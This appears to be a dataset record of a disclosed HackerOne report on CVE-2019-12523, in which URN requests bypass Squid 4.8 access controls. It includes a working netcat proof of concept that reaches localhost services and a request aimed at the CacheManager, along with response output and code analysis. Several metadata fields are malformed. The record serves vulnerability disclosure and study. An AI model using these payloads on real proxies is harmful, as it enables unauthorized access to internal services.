{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "jeriko_one ",
  "title": "URN Request bypass ACL Checks",
  "content": "\nSummary:\nAttacker can bypass ACL checks gaining access to restricted HTTP servers such as those running on localhost. Attacker could also gain access to CacheManager if VIA\nheader is turned off. Only lines with : will be readable though, and the response must be less than 4096 bytes or it'll trigger the Heap Overflow I reported earlier.\nThis is due to URN request being transformed into HTTP request, and not going through the ACL checks that incoming HTTP request go through.\n<= Squid-4.8 Vulnerable\nFixed in Squid-4.9\nSquid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_8.txt\nAssigned CVE-2019-12523\nSteps To Reproduce:\nEnable URN by adding the following entry to Safe_ports\nCode 37 Bytes\n1acl Safe_ports port 0           # urn\nEnsure that you're blocking request to localhost\nCode 29 Bytes\n1http_access deny to_localhost\n1) Start Squid\nCode 13 Bytes\n1./sbin/squid \n2) Start a HTTP server on localhost serving a file that has colons\nCode 43 Bytes\n1python -m http.server --bind 127.0.0.1 8080\nContents of hello.html\nCode 59 Bytes\n1<html>\n2\t<body>\n3\tNotice: For localhost only\n4\t</body>\n5</html>\n3) Make the following URN request\nCode 835 Bytes\n1echo -e \"GET urn::@127.0.0.1:8080/hello.html? HTTP/1.1\\r\\n\\r\\n\" |nc <squid hostname> 3128\n2\n3HTTP/1.1 302 Found\n4Server: squid/4.8\n5Mime-Version: 1.0\n6Date: Thu, 19 Mar 2020 18:11:20 GMT\n7Content-Type: text/html\n8Content-Length: 460\n9Expires: Thu, 19 Mar 2020 18:11:20 GMT\n10Location: \tNotice: For localhost only\n11X-Cache: MISS from g64\n12Via: 1.1 g64 (squid/4.8)\n13Connection: keep-alive\n14\n15<TITLE>Select URL for urn::@127.0.0.1:8080/hello.html?</TITLE>\n16<STYLE type=\"text/css\"><!--BODY{background-color:#ffffff;font-family:verdana,sans-serif}--></STYLE>\n17<H2>Select URL for urn::@127.0.0.1:8080/hello.html?</H2>\n18<TABLE BORDER=\"0\" WIDTH=\"100%\">\n19<TR><TD><A HREF=\"\tNotice: For localhost only\">\tNotice: For localhost only</A></TD><TD align=\"right\">Unknown</TD><TD> </TD></TR>\n20</TABLE><HR noshade size=\"1px\">\n21<ADDRESS>\n22Generated by squid/4.8@g64\n23</ADDRESS>\n24\nAnalysis\nURN Request are different than other request coming into Squid. The original\nURN request is hardly parsed from Anyp::Uri::parse only setting a scheme and path.\nAnyP::Uri::parse\n} else if (strncmp(url, \"urn:\", 4) == 0) {\ndebugs(23, 3, \"Split URI '\" << url << \"' into proto='urn', path='\" << (url+4) << \"'\");\ndebugs(50, 5, \"urn=\" << (url+4));\nsetScheme(AnyP::PROTO_URN, nullptr);\npath(url + 4);\nreturn true;\nOnce it's reached FwdState::Start it arrives in it's own URN code. The original\nURN request is then transformed into a new HTTP request.\nUrnState::setUriResFromRequest\nchar *host = getHost(uri);\nsnprintf(local_urlres, 4096, \"http://%s/uri-res/N2L?urn:\" SQUIDSBUFPH, host, SQUIDSBUFPRINT(uri));\nsafe_free(host);\nsafe_free(urlres);\nurlres_r = HttpRequest::FromUrl(local_urlres, r->masterXaction);\nThis new HTTP Request is sent directly to FwdState::Start without going\nthrough doCallouts or clientAccessChecks\nUrnState::created\nFwdState::Start(Comm::ConnectionPointer(), urlres_e,urlres_r.getRaw(), ale);\nThis allows a user to reach HTTP servers that were meant to\nbe blocked by Squid, e.g. localhost.\nhttp://:@127.0.0.1:7331/PATH?/uri-res/N2L?urn::@127.0.0.1:7331/PATH?\nSquid won't be able to callback into itself to access things like Cache\nManager since the VIA header will be set. If a Squid server was configured to\nnot send the Via header then this would give a user access to it.\nHere's a blog post that recommends removing VIA header to remove all Proxy\nheaders https://adamscheller.com/systems-administration/remove-proxy-headers-squid/\nIf via is off a user could send a request such as below to gain access\nGET urn::@localhost:3128/squid-internal-mgr/active_requests? HTTP/1.1\nBelow is the CacheManager getting accessed via this:\nBreakpoint 2, CacheManager::start (this=0x603000000e80, client=..., request=0x61c00001f880, entry=0x60c00001ff00, ale=...) at cachemanager.cc:307\n(gdb) p request->url->absolute->store.p->mem\n$25 = 0x62900000f200 \"http://g64:3128/squid-internal-mgr/active_requests?/uri-res/N2L?urn::@localhost:3128/squid-internal-mgr/active_requests?\nA user abusing this won't see the full response, since URN handles URLs and\nlooks for :. Therefore they would only see lines containing :\nAlso the current state of URN it's more likely that Squid would crash due to\noverflows than show the user any data. Once that is fixed this becomes a more\nreasonable way to leak internal responses.\nImpact\nAttacker can bypass all ACLs using an URN Request. This allows them to make HTTP GET Request to restricted resources. An attacker will be limited on what they can view from these request. Lines must contain : and the response must be less than 4096 bytes.\n\n",
  "severity": "[",
  "bounty": null,
  "weaknesses": "[",
  "screenshots": {},
  "disclosed_date": 1630035120,
  "report_url": "https://hackerone.com/reports/824802",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": "[",
  "Start Squid and a local HTTP server, then make a URN request with 'GET urn": ":@127.0.0.1:8080/hello.html? HTTP/1.1' via netcat",
  "vuln_description": "The vulnerability allows an attacker to bypass ACL checks in Squid by using URN requests, which are transformed into HTTP requests without undergoing the usual access control checks. This enables access to restricted HTTP servers (like localhost) and potentially the CacheManager if VIA headers are disabled. The attacker can only view lines containing colons and responses under 4096 bytes to avoid triggering a heap overflow.",
  "reason": "This vulnerability involves understanding URN request handling in Squid, the transformation process to HTTP requests, and the bypass of ACL checks. The attacker must also be aware of response size limitations and the need for colons in the output. While the components are somewhat complex, the steps to exploit are straightforward once the URN handling flaw is understood.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "injection_classification": "}"
}